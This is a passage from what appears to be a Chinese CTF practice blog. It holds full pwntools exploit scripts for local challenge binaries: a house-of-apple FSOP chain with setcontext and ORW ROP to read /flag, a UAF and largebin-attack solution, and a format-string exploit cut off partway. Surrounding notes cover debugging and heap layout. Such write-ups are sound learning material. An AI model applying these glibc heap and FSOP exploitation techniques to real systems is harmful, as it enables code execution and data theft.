+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_wdoallocbuf (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<br>      <span class="hljs-keyword">return</span>;<br>  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,<br>		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>而这里会调用p-&gt;wide_data-&gt;vtable指向的跳转表，而这个没有检查跳转表是不是在规定的区间，所以可以修改为我们自己想要的值</p>
+<p>（然后我看的这份wp，因为极致的空间利用，导致某些部分有些重合，所以一直没看懂，只能这么一步一步的调试过来看QwQ）</p>
+<p>wp就是下面这样的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/python3<br><br>from pwn import *<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br>io=process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>io.sendlineafter(b<span class="hljs-string">&#x27;Please input your token: &#x27;</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">39</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">39</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>leaked_addr=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>print(<span class="hljs-string">&quot;leaked_addr&quot;</span>,hex(leaked_addr))<br>libc_addr=leaked_addr - <span class="hljs-number">126</span> - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>print(<span class="hljs-string">&quot;libc_addr&quot;</span>,hex(libc_addr))<br><span class="hljs-meta"># gdb.attach(io)</span><br><br>#在<span class="hljs-built_in">stdin</span>的_IO_buf_base地址写\x00<br>target=libc_addr + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="hljs-number">0x38</span><br>print(<span class="hljs-string">&quot;target&quot;</span>,hex(target))<br>io.sendlineafter(b<span class="hljs-string">&#x27;Choice: &#x27;</span>, b<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-meta"># </span><br><span class="hljs-meta">io.sendlineafter(b<span class="hljs-string">&#x27;Size: &#x27;</span>, str(target + 1).encode())</span><br>io.sendlineafter(b<span class="hljs-string">&#x27;Content: &#x27;</span>, b<span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-built_in">stdout</span>=libc_addr + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br><br>io.send(b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-built_in">stdout</span>)+p64(<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0x300</span>))<br><br>IO_wfile_jumps=libc_addr + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>gadget=<span class="hljs-number">0x0000000000176f3e</span>+libc_addr<br>setcontext=libc_addr + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>openat=libc_addr + libc.sym[<span class="hljs-string">&#x27;openat&#x27;</span>]<br>read_addr=libc_addr + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libc_addr + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>rdi = libc_addr + <span class="hljs-number">0x000000000010f78b</span><br>rsi = libc_addr + <span class="hljs-number">0x0000000000110a7d</span><br>rdx = libc_addr + <span class="hljs-number">0x00000000000ab8a1</span><br>rcx = libc_addr + <span class="hljs-number">0x00000000000a877e</span><br><br>flag_addr = libc_addr + <span class="hljs-number">0x2034a0</span><br><br>gdb.attach(io)<br>payload = flat(&#123;<span class="hljs-number">0x0</span>:(~(<span class="hljs-number">2</span> | <span class="hljs-number">0x8</span> | <span class="hljs-number">0x800</span>)),<br>                <span class="hljs-number">0x28</span>:<span class="hljs-number">1</span>,<br>                <span class="hljs-number">0x38</span>:<span class="hljs-number">0</span>,<br>                <span class="hljs-number">0x88</span>:libc_addr+<span class="hljs-number">0x203000</span>,      # <span class="hljs-string">&#x27;_lock&#x27;</span><br>                <span class="hljs-number">0xa0</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0xf0</span>,             # <span class="hljs-string">&#x27;_wide_data&#x27;</span><br>                <span class="hljs-number">0xc0</span>:<span class="hljs-number">0</span>,                       # <span class="hljs-string">&#x27;_mode&#x27;</span><br>                <span class="hljs-number">0xd8</span>:IO_wfile_jumps,          # <span class="hljs-string">&#x27;vtable&#x27;</span><br>                <span class="hljs-number">0xe8</span>:<span class="hljs-built_in">stdout</span><br>               &#125;, filler=b<span class="hljs-string">&quot;\x00&quot;</span>)#触发house of apple<br><br>payload += flat(&#123;<span class="hljs-number">0x0</span>:b<span class="hljs-string">&quot;/flag\x00\x00\x00&quot;</span>,<br>                 <span class="hljs-number">0x8</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0xf0</span>+<span class="hljs-number">0x20</span>,   #使用gadget的时候控制可以call setcontext+<span class="hljs-number">61</span><br>                 <span class="hljs-number">0x18</span>:<span class="hljs-number">0</span>,<br>                 <span class="hljs-number">0x30</span>:<span class="hljs-number">0</span>,<br>                 <span class="hljs-number">0x38</span>:gadget,<br>                 <span class="hljs-number">0x40</span>:setcontext+<span class="hljs-number">61</span>,<br>                 <span class="hljs-number">0xe0</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0x128</span><span class="hljs-number">-0x68</span>,   # 这里应该是wide_data-&gt;vtable，调用偏移为<span class="hljs-number">0x68</span><br>                 <span class="hljs-number">0xc0</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0x1d8</span>,        <span class="hljs-meta"># rsp</span><br>                 <span class="hljs-number">0xc8</span>:openat,              <span class="hljs-meta"># rip</span><br>                 <span class="hljs-number">0x88</span>:<span class="hljs-number">-100</span>,                <span class="hljs-meta"># rdi</span><br>                 <span class="hljs-number">0x90</span>:<span class="hljs-built_in">stdout</span>+<span class="hljs-number">0xf0</span>,         <span class="hljs-meta"># rsi</span><br>                 <span class="hljs-number">0xa8</span>:<span class="hljs-number">4</span>                    <span class="hljs-meta"># rdx</span><br>                &#125;, filler=b<span class="hljs-string">&quot;\x00&quot;</span>)<br><br>payload += flat([rdi, <span class="hljs-number">3</span>, rsi, flag_addr, rcx, flag_addr<span class="hljs-number">-0x10</span>, rdx, <span class="hljs-number">0x50</span>,<br>                 read_addr, rdi, <span class="hljs-number">1</span>, write_addr])<br><br><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>（本来刷题记录不想写这么多的，但是奈何我当时真的没看懂那一份wp，我好菜QwQ）</p>
+<p>好像进入到puts的调用链里面只需要控制f-&gt;_wide_data-&gt;_IO_write_end &#x3D;0，f-&gt;_wide_data-&gt;_IO_write_ptr&#x3D;0，fp-&gt;_wide_data-&gt;_IO_buf_base&#x3D;0就可以了，还有flag字段(~(2 | 0x8 | 0x800))就基本全绕过了（应该？）</p>
+<p>这几天就这样吧，明天在做吧，打算做一道house of apple的</p>
+<h2 id="2025-11-21-25——pwn-oneday"><a href="#2025-11-21-25——pwn-oneday" class="headerlink" title="2025.11.21-25——pwn_oneday"></a>2025.11.21-25——pwn_oneday</h2><p>今天做的事roderick师傅在介绍自己发现的house of apple的文章里面放的例题，之前本来打算写的，写了一半有事就给忘记了，今天打算重新做一下这道题</p>
+<p>题目介绍：存在uaf漏洞，只能分配largebin，有三种大小key，key+16,2*key,使用的calloc分配，只能分配16个chunk，存在一次输出和一次写入</p>
+<p>有一个问题，就是因为只有一次写，所以我们得布置一下堆空间，让wide_data写入的地址能够让我们在进行largebin attack的时候恰好也布置了。</p>
+<p>这个堆风水，好难搞，为什么这个堆风水这么难配QAQ</p>
+<p>经过我这几天坚持不懈的调试，终于，终于自己做出来了，太不容易了，我以为我应该是理解了house of apple这个利用手法的，但是当我做这道题目的时候，几乎是写一点卡一下，只能一点一点调试，然后修改我的伪造的结构的布局。踩的坑太多了，简直都不知道该怎么记录，所幸最后还是做出来了，当看到我自己写的flag出现在终端的时候，简直就是感动，太不容易了，实在还是太不容易了。</p>
+<p>记录一下踩坑（可能太多了，有些我都不记得了）</p>
+<p>1.当时配那个堆风水的时候，最开始我没有采纳roderick师傅写在例题处的那种方式，而是尝试自己去配。我当时采用的方案是先free一个2的chunk到largebin，然后通过之前放到这个chunk的0x30处的指针构造一个fake chunk1进行释放（通过唯一一次写修改那个chunk2），我甚至还在下面再构造一个0x80的chunk就是想绕过这个double free检测，但是我没想到还会继续往下查看我的prev_size对不对得上，导致一直没绕过（晕了）。最后还是采用roderick师傅得构造方式的时候才知道有多精妙，刚好可以溢出0x10,修改下一个chunk的size位。（所以chunk伪造还得是最少修改最好（确信））</p>
+<p>2.然后就是构造结构体，太复杂了，因为我是纯手工自己配置，导致我写的地址总存在偏差，不得不一直动调进去计算，查看错误点，甚至因为太过混乱，我弄错了好几个字段，搞得我调了好久都不知道为什么会出问题。(这期间应该还有坑，但是我忘记了）（所以感觉house of apple有一个预制脚本真的是太爽了）</p>
+<p>3.最后就是最后的rop部分了，我直接使用的bph的orw，结果，这些rdx竟然太大了，导致打开和读取失败，一段时间里面一直给我只读出来aaaaaaaaa，卡在最后一步一度让我很沮丧。但是因为知道rdx过大可能会造成函数调用失败，所以还是很快排查出来了。</p>
+<p>接下来就是，终于写好了的wp！</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs c">#! /bin/python3 <br>from pwn import*<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br>io=process(<span class="hljs-string">&#x27;./oneday&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./oneday&#x27;</span>)<br><br>def choose(number):<br>    io.recvuntil(b<span class="hljs-string">&#x27;enter your command: \n&#x27;</span>)<br>    io.sendline(str(number).encode())<br>    <br>def add(choise):<br>    choose(<span class="hljs-number">1</span>)<br>    io.recvuntil(b<span class="hljs-string">&#x27;choise: &#x27;</span>)<br>    io.sendline(str(choise).encode())<br>    <br>def dele(index):<br>    choose(<span class="hljs-number">2</span>)<br>    io.recvuntil(b<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(str(index).encode())<br>    <br>def read(index,content):<br>    choose(<span class="hljs-number">3</span>)<br>    io.recvuntil(b<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(str(index).encode())<br>    io.recvuntil(b<span class="hljs-string">&#x27;Message: \n&#x27;</span>)<br>    io.send(content)<br><br>def write(index):<br>    choose(<span class="hljs-number">4</span>)<br>    io.recvuntil(b<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(str(index).encode())<br>    <br>io.sendlineafter(b<span class="hljs-string">&#x27;enter your key &gt;&gt;\n&#x27;</span>,b<span class="hljs-string">&#x27;10&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>)#<span class="hljs-number">0</span><br>add(<span class="hljs-number">2</span>)#<span class="hljs-number">1</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">2</span><br><br>dele(<span class="hljs-number">2</span>)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">3</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">4</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">5</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">6</span><br><br>dele(<span class="hljs-number">3</span>)<br>dele(<span class="hljs-number">5</span>)<br><br>write(<span class="hljs-number">3</span>)<br>io.recvline()<br>libc_addr=u64(io.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>heap=u64(io.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>offset_libc=<span class="hljs-number">0x7f70f84e8cc0</span><span class="hljs-number">-0x7f70f82f6000</span> <br>offset_heap=<span class="hljs-number">0x0000555c95af47f0</span><span class="hljs-number">-0x555c95af3000</span><br>libc_addr-=offset_libc<br>heap-=offset_heap<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;libc_addr:&#x27;</span>+hex(libc_addr))<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;heap:&#x27;</span>+hex(heap))<br><br>dele(<span class="hljs-number">4</span>)<br>dele(<span class="hljs-number">6</span>)<br><br>add(<span class="hljs-number">3</span>)#<span class="hljs-number">7</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">8</span><br>add(<span class="hljs-number">1</span>)#<span class="hljs-number">9</span><br><br>dele(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">3</span>)#<span class="hljs-number">10</span><br><br>offset=<span class="hljs-number">0x00007f299fd31260</span><span class="hljs-number">-0x7f299fb3e000</span><br><span class="hljs-built_in">stdout</span>=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>io_file_list=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;io_file_list:&#x27;</span>+hex(io_file_list))<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;stdout:&#x27;</span>+hex(<span class="hljs-built_in">stdout</span>))<br>heap1=heap+<span class="hljs-number">0x561ed1799810</span> - <span class="hljs-number">0x561ed1798000</span> <br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;heap1:&#x27;</span>+hex(heap1))<br>io_wfile_jump=libc_addr+libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>magic=libc_addr+<span class="hljs-number">0x00000000000fbe9e</span> <span class="hljs-meta">#mov rdx, qword ptr [rax + 0xb0] ; call qword ptr [rax + 0x88]</span><br>gadget=libc_addr+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;gadget:&#x27;</span>+hex(gadget))<br>openat=libc_addr + libc.sym[<span class="hljs-string">&#x27;openat&#x27;</span>]<br>read_addr=libc_addr + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libc_addr + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rdi=libc_addr+<span class="hljs-number">0x000000000002daa2</span><br>rsi=libc_addr+<span class="hljs-number">0x0000000000037c0a</span><br>rdx_r12=libc_addr+<span class="hljs-number">0x00000000001066e1</span><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(io_file_list<span class="hljs-number">-0x20</span>)<br>payload+=flat(&#123;<span class="hljs-number">0x0</span>:(~(<span class="hljs-number">2</span> | <span class="hljs-number">0x8</span> | <span class="hljs-number">0x800</span>)),<br>               <span class="hljs-number">0x8</span>:<span class="hljs-number">0xa81</span>,<br>               <span class="hljs-number">0x28</span>:<span class="hljs-number">1</span>, #这个值会被覆盖掉<br>               <span class="hljs-number">0x38</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0x88</span>:heap1+<span class="hljs-number">0x500</span>,<span class="hljs-meta">#lock</span><br>               <span class="hljs-number">0xa0</span>:heap1+<span class="hljs-number">0xf0</span>,#wide_data<br>               <span class="hljs-number">0xc0</span>:<span class="hljs-number">0</span>,<span class="hljs-meta">#mode</span><br>               <span class="hljs-number">0xd8</span>:io_wfile_jump,<span class="hljs-meta">#vtable</span><br>               <span class="hljs-number">0xe0</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0xe8</span>:<span class="hljs-number">0</span>#最后两个<span class="hljs-number">0</span>写错了，只是偏移之前已经计算好了，再改比较麻烦，就留下了<br>&#125;)<br>payload+=flat(&#123;<span class="hljs-number">0x0</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0x18</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0x30</span>:<span class="hljs-number">0</span>,<br>               <span class="hljs-number">0x68</span>:magic,<br>               <span class="hljs-number">0x88</span>:gadget+<span class="hljs-number">61</span>,<br>               <span class="hljs-number">0xb0</span>:heap1+<span class="hljs-number">0x1f0</span>,<br>               <span class="hljs-number">0xe0</span>:heap1+<span class="hljs-number">0xf0</span>,<br>               <span class="hljs-number">0xe8</span>:<span class="hljs-number">0</span><br>               &#125;)<br>payload+=p64(<span class="hljs-number">0</span>)+b<span class="hljs-string">&#x27;/flag\x00\x00\x00&#x27;</span><br>payload+=flat(&#123;<span class="hljs-number">0xa0</span>:heap1+<span class="hljs-number">0x2f0</span>,<span class="hljs-meta">#rsp</span><br>               <span class="hljs-number">0xa8</span>:openat,<span class="hljs-meta">#rcx</span><br>               <span class="hljs-number">0x68</span>:<span class="hljs-number">-100</span>,<span class="hljs-meta">#rdi</span><br>               <span class="hljs-number">0x70</span>:heap1+<span class="hljs-number">0x1e8</span>,<span class="hljs-meta">#rsi</span><br>               <span class="hljs-number">0x88</span>:<span class="hljs-number">0</span><span class="hljs-meta">#rdx</span><br>               &#125;)<br>payload+=b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x50</span><br>payload+=p64(rdi)+p64(<span class="hljs-number">0x3</span>)+p64(rsi)+p64(heap1+<span class="hljs-number">0x400</span>)+p64(rdx_r12)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x0</span>)+p64(read_addr)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0x1</span>)+p64(rsi)+p64(heap1+<span class="hljs-number">0x400</span>)+p64(rdx_r12)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x0</span>)+p64(write_addr)<br>payload1=payload.ljust(<span class="hljs-number">0xa98</span>,b<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload1+=p64(<span class="hljs-number">0xab1</span>)<br><br><br>read(<span class="hljs-number">5</span>, payload1)<br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">3</span>)<br><span class="hljs-meta"># gdb.attach(io)</span><br>io.sendlineafter(b<span class="hljs-string">&#x27;enter your command: \n&#x27;</span>,b<span class="hljs-string">&#x27;9&#x27;</span>)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p>为什么感觉我的脚本写得还是那么丑陋呢（思索）</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251125231657-0sa7309.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>很久没有做一道题坚持这么久了，当看到flag的时候都开始感动了。</p>
+<p>明天的刷题预告是，阴间ctf的CMWL，之前没做出来，但是我现在感觉我应该能做了，而且考点是house of 魑魅魍魉，当时都不知道这个手法。</p>
+<h2 id="2025-11-22——cursed-format"><a href="#2025-11-22——cursed-format" class="headerlink" title="2025.11.22——cursed_format"></a>2025.11.22——cursed_format</h2><p>一个国外比赛的的题目，没什么新意，就纯考格式化字符串，只是因为之前不太喜欢格式化字符串所以一直不怎么会，用这道题练了练</p>
+<p>我只打了本地</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import*<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br>io=process(<span class="hljs-string">&#x27;./cursed_format&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./cursed_format&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <br><br>def xor(a: bytes, b: bytes) -&gt; bytes<br>    res = bytearray(len(a))<br>    <span class="hljs-keyword">for</span> i in range(len(a)):<br>        res[i] = a[i] ^ b[i % len(b)]<br>    <span class="hljs-keyword">return</span> bytes(res)<br><br><br>def strings(strings,key):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendline(xor(strings,key))<br>    <br>def leave():<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;2&#x27;</span>)<br>    <br>offset=<span class="hljs-number">12</span><br>offset1=<span class="hljs-number">0x29d90</span><br>strings((b<span class="hljs-string">&#x27;aaa%1$p.%19$p&#x27;</span>).ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>),b<span class="hljs-string">&#x27;\xff&#x27;</span>*<span class="hljs-number">32</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;aaa&#x27;</span>)<br><span class="hljs-built_in">stack</span>=<span class="hljs-type">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;.&#x27;</span>)<br>libc_addr=<span class="hljs-type">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>libc_addr-=offset1<br>print(<span class="hljs-string">&#x27;libc:&#x27;</span>,hex(libc_addr))<br>print(<span 